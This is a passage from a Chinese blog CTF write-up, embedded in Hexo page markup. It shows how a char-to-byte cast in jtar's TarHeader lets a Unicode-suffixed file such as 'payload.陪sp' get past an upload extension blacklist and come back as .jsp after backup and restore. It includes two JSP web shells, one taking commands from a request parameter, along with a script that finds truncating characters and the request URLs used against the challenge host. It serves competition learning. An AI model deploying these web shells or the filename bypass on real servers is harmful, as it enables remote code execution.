class="line">            case "txt":</span><br><span class="line">                return "text/plain";</span><br><span class="line">            default:</span><br><span class="line">                return "application/octet-stream";</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>具体原理可查看jtar源码（<a target="_blank" rel="noopener" href="https://github.com/kamranzafar/jtar%EF%BC%89%E4%B8%ADTarHeader%E7%9A%84">https://github.com/kamranzafar/jtar）中TarHeader的</a> getNameBytes方法如下，使用(byte)强制转换unicode文件名称时会导致字符截断， 打包后文件名称发生改变。 </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static int getNameBytes(StringBuffer name, byte[] buf, int offset, int length) {</span><br><span class="line">		int i;</span><br><span class="line"></span><br><span class="line">		for (i = 0; i &lt; length &amp;&amp; i &lt; name.length(); ++i) {</span><br><span class="line">			buf[offset + i] = (byte) name.charAt(i);</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		for (; i &lt; length; ++i) {</span><br><span class="line">			buf[offset + i] = 0;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		return offset + length;</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>buf[offset + i] = (byte)name.charAt(i);</code> 这一行将 char 强制转换为 byte, 由于 Java 中 char 是 16 位的 Unicode 字符 (0-65535), 而 byte 是有符号的 8 位整数（-128-127）, 强制转换时会截断高 8 位，仅保留低 8 位，所以这里我们只需要找到超出 byte 范围的 Unicode 值，它被转换成 byte 后就会变成指定的 ASCII 值 (如 char 的值为 257 时强制转换为 byte 就是为 1, 即 ascii 码为 1)</p>
+<p>利用这一点，我们可以将后缀带有特定unicode字符的文件上传 至靶机，绕过后缀黑名单检查，通过备份与恢复功能将上传的文件转变为jsp后缀的文 件并放回jsp可解析目录，最终RCE获取flag。</p>
+<p>文件名：payload.陪sp –&gt; payload.jsp </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import="java.io.*" %&gt; </span><br><span class="line">&lt;% </span><br><span class="line">String cmd = "printenv"; </span><br><span class="line">String output = ""; </span><br><span class="line">try { </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        Process p = Runtime.getRuntime().exec(cmd); </span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); </span><br><span class="line">        String line; </span><br><span class="line">        while ((line = reader.readLine()) != null) { </span><br><span class="line">            output += line + "&lt;br&gt;"; </span><br><span class="line">        } </span><br><span class="line">    } catch (Exception e) { </span><br><span class="line">        output = "Error executing command: " + e.getMessage(); </span><br><span class="line">    } </span><br><span class="line">%&gt; </span><br><span class="line"> </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt;&lt;title&gt;Command Output&lt;/title&gt;&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;h2&gt;Executed Command: &lt;code&gt;&lt;%= cmd %&gt;&lt;/code&gt;&lt;/h2&gt; </span><br><span class="line">&lt;pre&gt;&lt;%= output %&gt;&lt;/pre&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>[Command Output](http://35.241.98.126:31184/view?page=23709ae1-04e3-4a35-9fc9-6202eb616cbc)</code></p>
+<p>或</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import="java.util.*, java.io.*" %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">if (request.getParameter("cmd") != null) {</span><br><span class="line">    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));</span><br><span class="line">    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = br.readLine()) != null) {</span><br><span class="line">        out.println(line + "&lt;br&gt;");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">%&gt;</span><br><span class="line">&lt;h1&gt;Webshell Active&lt;/h1&gt;</span><br><span class="line">&lt;form method="GET"&gt;</span><br><span class="line">    &lt;input type="text" name="cmd" size="80"&gt;</span><br><span class="line">    &lt;input type="submit" value="Execute"&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>http://35.241.98.126:31184/view?page=23709ae1-04e3-4a35-9fc9-6202eb616cbc&amp;cmd=env</code></p>
+<p>解题所使用的unicode字符可以参考以下脚本获取，只要可以转换为正常后缀的 ASCII字符即可，例如payload.멪ⅳば也是相同效果。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import unicodedata </span><br><span class="line"> </span><br><span class="line">def reverse_search(byte_value): </span><br><span class="line">    low_byte = byte_value &amp; 0xFF </span><br><span class="line">    candidates = [] </span><br><span class="line"> </span><br><span class="line">for high in range(0x00, 0xFF + 1): </span><br><span class="line">code_point = (high &lt;&lt; 8) | low_byte </span><br><span class="line">try: </span><br><span class="line">char = chr(code_point) </span><br><span class="line">name = unicodedata.name(char) </span><br><span class="line">candidates.append((f"U+{code_point:04X}", char, name)) </span><br><span class="line">except ValueError: </span><br><span class="line">continue </span><br><span class="line">return candidates </span><br><span class="line">ascii_character = "j"  # "s","p" </span><br><span class="line">byte_val = ord(ascii_character) </span><br><span class="line">print(f"Possible original characters ({byte_val} → 0x{byte_val &amp; 0xFF:02X}）:") </span><br><span class="line">results = reverse_search(byte_val) </span><br><span class="line">for cp, char, name in results: </span><br><span class="line">print(f"{cp}: {char} - {name}")</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/64b88b0c1be2aa1d78f952461ef4e113.png"></p>
+<p>另外，其实选手如果有心注意的话，在jtar的github项目里有一条23年的pr（最上 方），是关于中文编码错误的修改（但并未被合并），可以作为一条潜在的hint，提醒 选手关注jtar的编码问题。       </p>
+<hr>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2025/05/18/d-3ctf/">http://example.com/2025/05/18/d-3ctf/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/07/16/hello-world/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Hello World">
+                        
+                        <span class="card-title">Hello World</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-07-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q1n9
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/05/18/h-nctf/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="H&amp;Nctf">
+                        
+                        <span class="card-title">H&amp;Nctf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q1n9
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">7.4k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
